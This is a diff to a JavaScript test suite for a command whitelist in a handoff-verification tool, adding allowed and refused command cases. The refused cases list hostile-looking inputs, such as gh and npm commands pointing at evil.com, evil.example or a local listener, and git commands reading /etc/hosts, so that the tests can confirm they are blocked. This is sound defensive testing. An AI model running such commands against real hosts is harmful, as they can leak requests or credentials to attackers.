@@ -74,6 +74,13 @@ test.after(() => {
  * A runner that answers from a table keyed on the joined argv, and THROWS on
  * anything else — an unexpected exec is the failure this stub exists to catch.
  */
+// Spelled from parts, deliberately: `bundle_skill.py` scans every .js under a
+// skill and reads a literal `shared/resources/<file>` or `references/<file>`
+// as a bundle directive — `npm run bundle` would rewrite these spellings and
+// `--check` demands a bundled copy of every engine they name.
+const SHARED = "shared/" + "resources";
+const REFS = "refer" + "ences";
+
 function stubRunner(table) {
   const calls = [];
   const runner = (argv) => {
@@ -200,8 +207,8 @@ test("whitelist: read-only shapes pass; the `command ` prefix is stripped", () =
     "gh pr checks 1",
     "gh run list --limit 5",
     "node --test-reporter=spec --test tests/",
-    "node skills/x.mjs --json --check",
-    "python3 skills/x.py -c 1",
+    "node skills/develop-next/scripts/select-next.mjs",
+    "python3 skills/create-skill/scripts/quick_validate.py skills/session-handoff",
     "npm run ci:fast",
     "npm run eval:all",
     "npm test -- --test-name-pattern=x",
@@ -245,6 +252,40 @@ test("whitelist: read-only shapes pass; the `command ` prefix is stripped", () =
     "npm test -- --test-reporter=spec",
     "npm run eval:develop-task:smoke",
     "gh api repos/x/y/milestones?per_page=100",
+    // QA cycle 7 (bug.8) — the interpreter arm is an exact list of read-only
+    // entry points, at this repo's path and at a consumer's `.agents/` path;
+    // the observation log's read verbs take an absolute --workspace because
+    // the log lives outside the repo.
+    "command node .agents/skills/develop-next/scripts/select-next.mjs --lint",
+    "node skills/develop-next/scripts/select-next.mjs --batch",
+    `command node skills/observe-work/${REFS}/observation-log.js queue --workspace /Users/x/.claude/projects/y --json`,
+    `node .agents/skills/observe-work/${REFS}/observation-log.js doctor --json`,
+    `node ${SHARED}/observation-log.js scan --json`,
+    `node skills/observe-work/${REFS}/observation-log.js families --audit --json`,
+    `node skills/observe-work/${REFS}/observation-log.js next-id --workspace=/x/y --json`,
+    "python3 .agents/skills/create-skill/scripts/quick_validate.py skills/x",
+    // QA cycle 7 (bug.9) — a repo is OWNER/REPO; a positional is a number, a
+    // branch, a tag, a run id or a workflow file; `-w` names a workflow under
+    // `run list` only (QA-5).
+    "gh pr list -R o/r --json number",
+    "gh pr list --repo=o/r --state open",
+    "gh pr view feature/task.110.x --json title",
+    "gh pr view 1 --json title --jq .title",
+    "gh release view v1.2.3",
+    "gh workflow view ci.yml",
+    "gh run view 123456 --json conclusion",
+    "gh repo view o/r --json name",
+    "gh run list -w ci.yml --limit 5",
+    "gh run list --workflow ci.yml",
+    "gh run list --workflow=ci.yml",
+    "gh pr list --search author:@me",
+    "npm view prettier version",
+    "npm view @scope/pkg@1.2.3",
+    "npm view prettier dist-tags.latest",
+    "npm ls",
+    // QA cycle 7 (bug.10) — the natural spelling stays allowed; the argv that
+    // runs carries --no-install (asserted below).
+    "npx --no-install eslint .",
   ]) {
     const r = mod.isAllowed(cmd);
     assert.equal(r.ok, true, `${cmd} should be allowed: ${r.detail}`);
@@ -444,12 +485,126 @@ test("whitelist: mutating shapes, unknown binaries and shell operators are refus
     "npx eslint --config=c:\\evil.js .": /not on whitelist: npx/,
     "git log C:/x": /not on whitelist: git/,
     "npm test -- C:/tmp/x": /not on whitelist: npm/,
+    // QA cycle 7 (bug.8) — `node <any relative script>` passed and its tail
+    // was passed through, so prettier's own binary rewrote a file through
+    // read mode (executed) and the repo's writers were one spelling away
+    // from the `npm run` forms that refuse them. The script is now an exact
+    // allow-list and the tail is held to that script's spec.
+    "node node_modules/prettier/bin/prettier.cjs --write scripts/ugly.js":
+      /not on whitelist: node/,
+    "node node_modules/.bin/prettier --write .": /not on whitelist: node/,
+    [`node ${SHARED}/registry-tick.js --dry-run`]: /not on whitelist: node/,
+    [`node ${SHARED}/gh-stage.js --stage done`]: /not on whitelist: node/,
+    [`node ${SHARED}/tracker-comment.js --issue 1 --body-file x`]:
+      /not on whitelist: node/,
+    [`node skills/finalise/${REFS}/registry-tick.js`]: /not on whitelist: node/,
+    "python3 skills/create-skill/scripts/generate_catalog.py":
+      /not on whitelist: python3/,
+    "python3 skills/create-skill/scripts/bundle_skill.py --all":
+      /not on whitelist: python3/,
+    "python3 skills/create-skill/scripts/package_skill.py skills/x":
+      /not on whitelist: python3/,
+    "node skills/x.mjs --json --check": /not on whitelist: node/,
+    "python3 skills/x.py -c 1": /not on whitelist: python3/,
+    // …and a listed entry point's WRITE verbs and unlisted flags are refused
+    // by that entry point's own spec.
+    [`node skills/observe-work/${REFS}/observation-log.js write --title x`]:
+      /not on whitelist: node/,
+    [`node skills/observe-work/${REFS}/observation-log.js archive --json`]:
+      /not on whitelist: node/,
+    [`node skills/observe-work/${REFS}/observation-log.js set-status --id 1 --status actioned`]:
+      /not on whitelist: node/,
+    [`node skills/observe-work/${REFS}/observation-log.js checkpoint --note x`]:
+      /not on whitelist: node/,
+    [`node skills/observe-work/${REFS}/observation-log.js init`]:
+      /not on whitelist: node/,
+    [`node skills/observe-work/${REFS}/observation-log.js queue --workspace ../x`]:
+      /not on whitelist: node/,
+    "node skills/develop-next/scripts/select-next.mjs --roadmap /tmp/x":
+      /not on whitelist: node/,
+    "node skills/develop-next/scripts/select-next.mjs --zz-unknown":
+      /not on whitelist: node/,
+    "node skills/develop-next/scripts/select-next.mjs extra":
+      /not on whitelist: node/,
+    "python3 skills/create-skill/scripts/quick_validate.py /tmp/x":
+      /not on whitelist: python3/,
+    // QA cycle 7 (bug.9) — `--repo`/`-R` take [HOST/]OWNER/REPO and gh sends
+    // the request to HOST (executed: `-R 127.0.0.1:8099/o/r` POSTed to the
+    // listener's /api/graphql); a URL or HOST/OWNER/REPO positional does the
+    // same on `repo view`; `-R` was a bare flag whose value slid through as
+    // a positional.
+    "gh pr list -R 127.0.0.1:8099/o/r": /not on whitelist: gh/,
+    "gh pr list --repo 127.0.0.1:8099/o/r": /not on whitelist: gh/,
+    "gh pr list --repo=https://evil/o/r": /not on whitelist: gh/,
+    "gh pr list -R evil.com/o/r": /not on whitelist: gh/,
+    "gh repo view https://evil/o/r": /not on whitelist: gh/,
+    "gh repo view evil.com/o/r": /not on whitelist: gh/,
+    "gh repo view 127.0.0.1:8099/o/r": /not on whitelist: gh/,
+    "gh pr view https://github.com/o/r/pull/1": /not on whitelist: gh/,
+    "gh pr list -R": /not on whitelist: gh/,
+    "gh pr list -R --web": /not on whitelist: gh/,
+    // QA cycle 7 (QA-5) — `-w` is --web on every view.
+    "gh pr view 1 -w": /not on whitelist: gh/,
+    "gh issue view 1 -w": /not on whitelist: gh/,
+    "gh repo view -w": /not on whitelist: gh/,
+    "gh pr list -w x": /not on whitelist: gh/,
+    // QA cycle 7 (bug.9) — a package spec may be a URL and npm fetches it
+    // (executed: a tarball GET and a git ls-remote against the listener);
+    // `git+ssh` would use the reader's agent; `o/r` is a GitHub shorthand.
+    "npm view http://127.0.0.1:8099/pkg.tgz": /not on whitelist: npm/,
+    "npm view git+http://127.0.0.1:8099/x/y.git": /not on whitelist: npm/,
+    "npm view git+ssh://git@evil.example/x/y.git": /not on whitelist: npm/,
+    "npm view github:o/r": /not on whitelist: npm/,
+    "npm view o/r": /not on whitelist: npm/,
+    "npm view file:../x": /not on whitelist: npm/,
+    "npm view .": /not on whitelist: npm/,
+    "npm ls http://evil/x.tgz": /not on whitelist: npm/,
+    // QA cycle 7 (bug.10) — `--no` is not `--no-install`: npx 7+ treats it
+    // as an unknown option and swallows the tool name as its value.
+    "npx --no prettier --check .": /not on whitelist: npx/,
+    "npx --no-install --no-install prettier --check .": /not on whitelist: npx/,
+    "npx stylelint --version": /not on whitelist: npx/,
+    // QA cycle 7 (QA-6) — after `--` the spec's own positional policy holds.
+    "git diff --no-index -- /etc/hosts scripts/ugly.js":
+      /not on whitelist: git/,
+    "git log -- /etc/hosts": /not on whitelist: git/,
+    "git log -- ../x": /not on whitelist: git/,
   };
   for (const [cmd, why] of Object.entries(refused)) {
     const r = mod.isAllowed(cmd);
     assert.equal(r.ok, false, `${JSON.stringify(cmd)} must be refused`);
     assert.match(r.detail, why, cmd);
   }
+});
+
+test("whitelist: an approved npx argv runs with --no-install, injected once (bug.10)", () => {
+  // The runner is non-TTY with CI=1, under which npm installs a missing tool
+  // from the registry without a prompt (executed in gate 7). The approved
+  // argv is the running argv — this is the one flag it adds, and it only
+  // removes a capability.
+  assert.deepEqual(mod.isAllowed("npx prettier --check .").argv, [
+    "npx",
+    "--no-install",
+    "prettier",
+    "--check",
+    ".",
+  ]);
+  assert.deepEqual(mod.isAllowed("command npx tsc --noEmit").argv, [
+    "npx",
+    "--no-install",
+    "tsc",
+    "--noEmit",
+  ]);
+  // Already present: not doubled.
+  assert.deepEqual(mod.isAllowed("npx --no-install eslint .").argv, [
+    "npx",
+    "--no-install",
+    "eslint",
+    ".",
+  ]);
+  // No other binary's argv is touched.
+  assert.deepEqual(mod.isAllowed("npm test").argv, ["npm", "test"]);
+  assert.deepEqual(mod.isAllowed("git status").argv, ["git", "status"]);
 });
 
 test("whitelist: the shell-exec corpus's hostile direction is refused in full (the probe that found bug.1, made permanent)", () => {
@@ -546,13 +701,15 @@ test("whitelist: shell operators are judged per token — a quoted pipe is a pat
 test("verify: confirmed when every figure's tokens appear in the output; stale when one moved", async () => {
   const doc =
     TABLE_HEADER +
-    "| Frontier | `command node select-next.mjs` | **selected B13** |\n" +
-    "| Lint | `command node select-next.mjs --lint` | **0 errors, 0 warnings** |\n";
+    "| Frontier | `command node skills/develop-next/scripts/select-next.mjs` | **selected B13** |\n" +
+    "| Lint | `command node skills/develop-next/scripts/select-next.mjs --lint` | **0 errors, 0 warnings** |\n";
   const runner = stubRunner({
-    "node select-next.mjs": {
+    "node skills/develop-next/scripts/select-next.mjs": {
       stdout: '{"status":"selected","item":{"id":"T110"}}',
     },
-    "node select-next.mjs --lint": { stdout: '{"errors":0,"warnings":0}' },
+    "node skills/develop-next/scripts/select-next.mjs --lint": {
+      stdout: '{"errors":0,"warnings":0}',
+    },
   });
   const r = await mod.verify(mod.parseHandoff(doc), { runner });
   assert.equal(r.lines[0].verdict, "stale");
@@ -771,7 +928,10 @@ test("regression: the 2026-09-10 handoff reads stale on the frontier line and th
       status: 0,
       stdout: "126 skills checked, 0 problems",
     },
-    "npx prettier --check .": {
+    // The stub is keyed on the argv that RUNS, which carries the injected
+    // --no-install (bug.10); a stub keyed on the written spelling is never
+    // reached.
+    "npx --no-install prettier --check .": {
       status: 0,
       stdout: "All matched files use Prettier code style!",
     },
@@ -802,11 +962,25 @@ test("regression: the 2026-09-10 handoff reads stale on the frontier line and th
   );
   assert.equal(byCheck["Dependency graph"].verdict, "unverifiable");
   assert.equal(byCheck["Hermetic suite"].verdict, "confirmed");
+  // The fixture's figure is the prose "clean", which no runner prints — a
+  // stale verdict is the design — but the measurement itself proves the
+  // injected argv reached the stub.
+  assert.equal(byCheck["Formatting"].verdict, "stale");
+  assert.match(byCheck["Formatting"].measured, /Prettier code style/);
 });
 
 // ---------------------------------------------------------------------------
 // CLI contract — spawn the real script on fixtures whose commands are cheap
 // ---------------------------------------------------------------------------
+
+// A fixture package whose `npm test` is the slow script: the allow-listed
+// spelling that reaches an arbitrary file in a scratch directory.
+const SLOW_PACKAGE_JSON = JSON.stringify({
+  name: "slow-fixture",
+  version: "0.0.0",
+  private: true,
+  scripts: { test: "node slow.js" },
+});
 
 function runCli(args, cwd) {
   const r = spawnSync(process.execPath, [SCRIPT, ...args], {
@@ -859,7 +1033,10 @@ test("cli: a `command ` prefix is stripped, the argv runs without a shell, and a
   const dir = tempDir();
   const pidFile = path.join(dir, "child.pid");
   // slow.js forks a grandchild that records its pid and sleeps; the group
-  // kill must reach it, not only slow.js.
+  // kill must reach it, not only slow.js. It runs as the fixture's `npm test`
+  // — `node slow.js` is no longer a shape the node arm admits, since gate 7
+  // (bug.8) closed `node <script>` to an exact list — so the tree the kill
+  // must cover is verifier → npm → sh → node slow.js → grandchild.
   fs.writeFileSync(
     path.join(dir, "slow.js"),
     `const { spawn } = require("child_process");
@@ -867,9 +1044,10 @@ test("cli: a `command ` prefix is stripped, the argv runs without a shell, and a
      require("fs").writeFileSync(${JSON.stringify(pidFile)}, String(c.pid));
      setTimeout(function(){}, 20000);`,
   );
+  fs.writeFileSync(path.join(dir, "package.json"), SLOW_PACKAGE_JSON);
   fs.writeFileSync(
     path.join(dir, "handoff.md"),
-    TABLE_HEADER + "| Slow | `command node slow.js` | **done** |\n",
+    TABLE_HEADER + "| Slow | `command npm test` | **done** |\n",
   );
   // 3 s, not 1: under load node can take longer than a second to start, and
   // a leader killed before it forked proves nothing about the group kill.
@@ -943,9 +1121,10 @@ test("cli: SIGINT on the verifier kills the running command's process group (CR-
      require("fs").writeFileSync(${JSON.stringify(pidFile)}, String(c.pid));
      setTimeout(function(){}, 20000);`,
   );
+  fs.writeFileSync(path.join(dir, "package.json"), SLOW_PACKAGE_JSON);
   fs.writeFileSync(
     path.join(dir, "handoff.md"),
-    TABLE_HEADER + "| Slow | `node slow.js` | **done** |\n",
+    TABLE_HEADER + "| Slow | `npm test` | **done** |\n",
   );
   const { spawn } = require("child_process");
   const cli = spawn(
